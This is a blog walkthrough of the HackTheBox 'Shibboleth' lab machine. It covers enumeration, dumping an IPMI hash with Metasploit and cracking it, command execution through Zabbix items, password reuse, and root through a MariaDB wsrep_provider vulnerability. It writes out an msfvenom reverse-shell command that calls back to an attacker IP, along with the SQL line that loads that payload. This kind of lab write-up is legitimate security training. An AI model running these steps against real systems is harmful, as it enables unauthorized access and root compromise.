---
layout: post
title: "HTB: SHIBBOLETH (10.10.11.124)"
description: "Shibboleth is a medium machine from HackTheBox created by knightmare & mrb3n. It starts off with a static website template. We will find a clue to look into BMC automation then find IPMI listening on UDP port 632. I will use Metasploit to leak a hash from IPMI, and crack it to get creds. This creds will allow me to log into Zabbix instance. Once in Zabbix i will use the Zabbix agent to execute commands and gain initial foothold. I will use credential reuse to pivots the next user. To get root, I’ll exploit a CVE in MariaDB / MySQL."
tags: [hackthebox, htb, boot2root, writeup, write-up, linux, snmp, zabbix, command execution, access control lists, shibboleth]
image: "/assets/img/shibboleth/shibboleth_feature.png"
---
## RECON
## Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

We run NMAP with default scripts and enumerate version and save it in the directory called nmap.
```nmap
$ nmap -sC -sV -oA nmap/shibboleth 10.10.11.124
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-31 02:42 EDT
Nmap scan report for 10.10.11.124
Host is up (0.67s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.75 seconds
```
From the result we only see one port open. Also, we note nmap was not redirected. Lets add shibboleth.htb to our hosts file and run the scan again.

```nmap
# Nmap 7.92 scan initiated Thu Mar 31 06:02:40 2022 as: nmap -sC -sV -vvv -oA nmap/shibboleth 10.10.11.124
Nmap scan report for 10.10.11.124
Host is up, received echo-reply ttl 63 (0.69s latency).
Scanned at 2022-03-31 06:02:41 EDT for 27s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 31 06:03:08 2022 -- 1 IP address (1 host up) scanned in 28.51 seconds
Based on the Apache/2.4.41 version, the host is likely running Ubuntu Focal (20.04LTS).
```
### Website - TCP 80
#### Site

Manually browsing to shibboleth.htb we see what seems like a default bootstrap website template.


#### Tech Stack
The response headers don’t give much info at all.

But the footer provides some interesting information that we need to take note of


#### Directory Brute Force

Trying directory Bruteforce using gobuster we get two directories.
```bash
└─$ gobuster dir -u http://shibboleth.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shibboleth.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/02 03:30:55 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/]
```
Under /forms we get a contact.php which gives an error. Checking out the validation js code under /assets I note the contact form application logic is not implemented.


The PHP Email Form Library is missing sigh!.. a dead end, so let's move on.

Thinking back to the footer text. Lets find additional vhosts using ffuf
```lua

└─$ ffuf -u http://shibboleth.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shibboleth.htb" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

monitor                 [Status: 200, Size: 3689, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3689, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3689, Words: 192, Lines: 30]
```
We get:

- `monitor.shibboleth.htb`
- `monitoring.shibboleth.htb`
- `zabbix.shibboleth.htb`

### Site
I will add all three to the hosts file and visit the pages.

All three `subdomains` redirect to the same login page

![zabbix login page](/assets/img/shibboleth/zabbix_login_page.png)

### What is Zabbix you ask :)?

Zabbix is an open-source, real-time monitoring tool for servers, networks and virtual machines and cloud services, which can be configured by using XML based templates.

I tested all the default password and weak credentials but none worked.

### UDP Port 623
A little research reminded me I never checked for any UDP ports open. Lets do just that.

Bingo! port 623 is open.


I found out ASF stands for Alert Standart Format, which is a DMTF standard for remote monitoring, management and control of computer systems.


Further research pointed me to Metasploit Framework's ipmi_version module which identifies a local BMC that supports IPMI version 2.0.



 According to this Rapid7 Blog Post We can also be able to dump the hashes of valid accounts using the Metasploit module ipmi_dumphashes.
Lets fire it up



And we get a hash. We will copy the hash and save it in a file called hashes and attempt to crack it with hashcat.

Hashcat new version can actually identify the hash type without having to provide the mode as seen below



 Hashcat cracked the hash in no time.

Our administrator really loves pumpkin pie 😎😎

Now we have a valid username:password, we can try log in to Zabbix



We get redirected to Zabbix dashboard, sweet!


Shell as Zabbix
Exploiting Zabbix
I now have to find a way to execute commands on zabbix agents.

Luckily i stumbled upon this Post .

We have to create a new item. Insert a command to spawn a reverse shell in the "Key" field. But before we get the revers shell, i have to test if we actually have RCE.

We shall do this by initiating a ping command back to our box. (always a good move :) )

Testing RCE


RCE confirmed


About time we get our shell


Finally we are on the box as Zabbix user


User Flag
To obtain the user flag we need to operate as ipmi-svc user.

zabbix@shibboleth:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
Lets see if our "pumpkin pie loving" admin reused their password.

zabbix@shibboleth:/$ su ipmi-svc
Password:
ipmi-svc@shibboleth:/$
ipmi-svc@shibboleth:/$ whoami
ipmi-svc
Sure enough they did and we are ipmi-svc user. We can also read the user flag.


Shell as root
Enumeration
Running processes
Checking at the running processes we can see there is mysql running.

Lets see if we can get the credentials from Zabbix config file.


Awesome! lets log in to the mysql service



Exploiting MariaDB
Checking the MariaDB version online I find a Vulnerability.

Let's Create a reverse shell binary with the using msfvenom and transfer the payload file to the target machine via wget as described in the PoC.

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=9003 -f elf-so -o george.so



Now we spin up a netcat session and wait for a connection.


Execute:

SET GLOBAL wsrep_provider="/tmp/george.so";

in the MariaDB server to trigger the payload.



Eureka!! We have root access.



****** And that was fun!!. Thank you for taking time to read my blog ************
